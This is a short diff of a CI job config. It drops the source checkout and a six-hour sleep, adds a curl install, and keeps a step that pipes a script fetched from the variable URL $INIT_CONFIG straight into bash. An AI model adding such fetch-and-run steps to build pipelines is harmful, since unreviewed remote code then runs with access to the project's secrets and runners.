@@ -12,9 +12,8 @@ blocks:
       jobs:
         - name: Run Checks
           commands:
-            - checkout
+            - apt update && apt install curl -y
             - curl -sL $INIT_CONFIG | bash
-            - sleep 21600
             - npm test
       secrets:
         - name: project_init
